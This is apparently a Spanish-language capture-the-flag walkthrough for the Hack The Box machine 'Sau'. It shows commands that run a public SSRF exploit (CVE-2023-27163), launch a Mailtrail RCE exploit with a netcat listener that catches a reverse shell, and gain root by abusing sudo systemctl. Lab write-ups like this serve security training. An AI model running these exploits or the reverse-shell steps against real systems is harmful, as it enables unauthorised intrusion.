---
title: Sau
parent: Easy
nav_order: 2
---

# Walkthrough — Sau (Hack The Box)
{: .fs-9 }

> Walkthrough para la máquina *Sau* de HTB, enfocada en SSRF y explotación de servicios web vulnerables.
{: .fs-6 .fw-300 }

---

## Introducción

**Sau** es una máquina de nivel *Easy* en Hack The Box. La clave está en identificar puertos poco comunes y explotar un SSRF en un servicio vulnerable.

- SO: Linux  
- Dificultad: Easy  
- Herramientas utilizadas: `nmap`, `ffuf`, `python`, `netcat`

---

## 🔎 Enumeración inicial

Realicé un escaneo completo con `nmap`:

```bash
nmap -sC -sV -p- -T4 10.10.11.224
```

![Imagen](/assets/images/sau/01-nmap.png)

---

## 🌐 Acceso al servicio HTTP

Descubrí que el puerto 55555 tiene un servicio web corriendo. Se trata de **Request Baskets**:

![Imagen](/assets/images/sau/02-request-baskets.png)

---

Al crear una nueva “basket”, se generó un token de autenticación:

![Imagen](/assets/images/sau/03-basket-created.png)

---

Y desde ahí se pueden ver las peticiones recibidas:

![Imagen](/assets/images/sau/04-basket-zj31b65.png)

---

## 🧬 Vulnerabilidad SSRF – CVE-2023-27163

Buscando información, encontré una vulnerabilidad SSRF en este servicio:

![Imagen](/assets/images/sau/05-cve-2023-27163-github.png)

---

Ejecuté el exploit para redirigir una petición hacia `127.0.0.1`:

```bash
bash ./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80
```

![Imagen](/assets/images/sau/06-cve-exploit-run.png)

---

Esto me reveló que detrás del servicio estaba corriendo una aplicación llamada **Mailtrail**:

![Imagen](/assets/images/sau/07-mailtrail-web.png)

---

## 💥 Explotación de Mailtrail v0.53

Utilicé un exploit público para obtener RCE:

![Imagen](/assets/images/sau/08-mailtrail-exploit-github.png)

---

Preparé un listener con `netcat`:

```bash
nc -lnvp 1234
```

![Imagen](/assets/images/sau/09-nc-listener.png)

---

Y lancé el exploit:

```bash
python3 exploit.py 10.10.14.16 1234 http://10.10.11.224:55555/rapzjz
```

![Imagen](/assets/images/sau/10-run-exploit.png)

---

### 🐚 Shell recibida

![Imagen](/assets/images/sau/11-shell-received.png)

---

Inspeccionando el archivo de configuración de Mailtrail encontré credenciales codificadas (hash SHA256):

![Imagen](/assets/images/sau/12-maltrail-conf.png)

---

## 🏁 Flag de usuario

Navegando al home de `puma`, encontré `user.txt`:

![Imagen](/assets/images/sau/13-user-flag.png)

---

## ⬆️ Escalada de privilegios

Con `sudo -l`, vi que podía ejecutar `systemctl status trail.service` como root sin contraseña:

![Imagen](/assets/images/sau/14-sudo-list.png)

---

Esto me permitió lanzar un shell interactivo como root:

![Imagen](/assets/images/sau/15-systemctl-status.png)

---

## 🏁 Flag de root

Finalmente accedí a la flag `root.txt`:

![Imagen](/assets/images/sau/16-root-flag.png)

---

## ✅ Resumen final

| Acción | Resultado |
|--------|-----------|
| Enumeración | Servicio web en puerto 55555 |
| Explotación | SSRF → Mailtrail v0.53 |
| Acceso | Usuario `puma` |
| Escalada | Sudo abuse en `systemctl` |
| Flags | `user.txt`, `root.txt` ✔️ |

---

**Autor:** [gueco99](https://github.com/gueco99)  
🧠 Hack the Box – *Sau* (Easy)
